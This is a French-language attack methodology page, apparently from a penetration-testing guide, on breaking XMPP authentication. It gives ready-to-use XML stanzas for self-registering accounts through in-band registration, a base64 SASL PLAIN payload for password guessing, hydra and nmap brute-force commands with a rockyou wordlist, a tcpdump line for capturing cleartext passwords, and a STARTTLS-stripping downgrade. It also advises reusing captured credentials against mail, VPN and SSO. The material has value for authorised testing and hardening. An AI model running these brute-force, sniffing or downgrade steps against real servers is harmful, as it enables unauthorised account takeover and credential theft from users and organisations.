---
title: "Authentification : SASL, inscription in-band, et rétrogradation de mécanisme"
description: "XMPP s'authentifie avec SASL sur le flux (PLAIN, SCRAM, DIGEST-MD5), de sorte que les identifiants peuvent être forcés par brute force en rejouant des stanzas AUTHENTICATE. L'inscription in-band permet à un attaquant de s'auto-provisionner un compte sans identifiant là où elle est activée, et lorsque STARTTLS n'est pas imposé, le mécanisme PLAIN envoie le mot de passe en clair base64, capturable sur le fil ou forcé par une rétrogradation."
keywords:
  - XMPP SASL
  - in-band registration
  - SASL PLAIN
  - mechanism downgrade
  - XMPP brute force
---

# Authentification

L'authentification XMPP s'appuie sur SASL à l'intérieur du flux XML. Après l'ouverture du flux, le serveur annonce ses mécanismes dans `<stream:features>`, le client en choisit un et envoie une stanza `<auth>` ; le serveur répond `<success/>` ou `<failure/>`. Trois choses rendent cela attaquable : l'échange `<auth>` est une requête compacte et scriptable, donc SASL est forçable par brute force ; l'inscription in-band (XEP-0077) permet à quiconque de créer un compte sur les serveurs qui l'autorisent, fournissant un identifiant à partir de rien ; et PLAIN transporte le mot de passe en base64 (pas en chiffrement), donc si STARTTLS est seulement proposé plutôt qu'exigé, l'identifiant est récupérable depuis le trafic capturé ou en orientant le client vers PLAIN.

## Prérequis

Un flux ouvert affichant `<stream:features>`. Notez quels mécanismes sont listés (PLAIN, SCRAM-SHA-1, SCRAM-SHA-256, DIGEST-MD5) et, surtout, si `<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'><required/></starttls>` est présent. Si STARTTLS est exigé, la rétrogradation et la capture en clair sont exclues et vous êtes limité au brute force SASL sur TLS et à l'inscription in-band. L'inscription in-band n'est utilisable que si l'[énumération](enumeration.md) a montré un formulaire `jabber:iq:register`.

## Inscription in-band pour s'auto-provisionner

```xml
<!-- request the registration form, then submit it to create the account -->
<iq type='get' id='r1' to='target.lan'><query xmlns='jabber:iq:register'/></iq>

<iq type='set' id='r2' to='target.lan'>
  <query xmlns='jabber:iq:register'>
    <username>recon</username>
    <password>Autumn2026!</password>
  </query>
</iq>
<!-- <iq type='result' id='r2'/> => the account recon@target.lan now exists and is yours -->
<!-- <error><conflict/></error> => the username is taken; <not-acceptable/> => registration closed -->
```

Un `type='result'` signifie que vous détenez désormais un compte réel sur le serveur sans identifiant préalable, suffisant pour exécuter une découverte de services authentifiée, rejoindre des salons, lire l'annuaire des utilisateurs, et atteindre le composant admin si l'autorisation est faible.

## SASL et brute force

La charge utile PLAIN est `authzid\0authcid\0password` encodée en base64, envoyée dans une seule stanza `<auth>` :

```bash
printf '\0jdoe\0Summer2026!' | base64
# => AGpkb2UAU3VtbWVyMjAyNiE=
```

```xml
<auth xmlns='urn:ietf:params:xml:ns:xmpp-sasl' mechanism='PLAIN'>AGpkb2UAU3VtbWVyMjAyNiE=</auth>
<!-- <success xmlns='urn:ietf:params:xml:ns:xmpp-sasl'/> => valid credential -->
<!-- <failure><not-authorized/></failure> => wrong password -->
```

Interprétez `<success/>` comme une connexion confirmée (le compte et le mécanisme entier sont à vous) et `<failure><not-authorized/></failure>` comme un mauvais mot de passe ; itérez la ligne base64 sur une liste de mots. L'outillage automatise cela contre une liste d'utilisateurs :

```bash
hydra -L users.txt -P rockyou.txt xmpp://target.lan
# nmap also brute-forces SASL: --script xmpp-brute
nmap -p5222 --script xmpp-brute --script-args userdb=users.txt,passdb=rockyou.txt target.lan
```

## Rétrogradation de mécanisme et capture en clair

Si `<starttls>` est proposé sans `<required/>`, vous pouvez terminer SASL PLAIN sans jamais négocier TLS, de sorte que le mot de passe base64 traverse le fil en clair ; une position sur le chemin le récupère directement :

```bash
tcpdump -i eth0 -A 'tcp port 5222' | grep -A1 "mechanism='PLAIN'"
# base64-decode the <auth> payload to split authcid and password on the \0 bytes
```

Parce que le serveur a annoncé PLAIN, un attaquant positionné peut aussi supprimer ou étouffer l'offre STARTTLS pour qu'un client qui aurait fait une mise à niveau négocie plutôt PLAIN en clair, transformant toute connexion sur ce segment en un identifiant capturé.

## Suite

- Un compte auto-provisionné ou forcé par brute force débloque l'énumération authentifiée, le composant admin, et la capacité de messager et d'usurper de vrais utilisateurs de la liste de contacts.
- Les identifiants PLAIN capturés sont généralement des comptes d'annuaire réutilisés dans toute l'organisation ; testez-les contre la messagerie, le VPN et le SSO.
- Un compte sur le serveur est le point d'ancrage pour les chemins de la console admin et des plugins dans l'[exploitation serveur](server-exploitation.md).

## Références

- [RFC 6120 (XMPP Core, SASL)](https://datatracker.ietf.org/doc/html/rfc6120#section-6)
- [XEP-0077 In-Band Registration](https://xmpp.org/extensions/xep-0077.html)
- [Nmap xmpp-brute script](https://nmap.org/nsedoc/scripts/xmpp-brute.html)
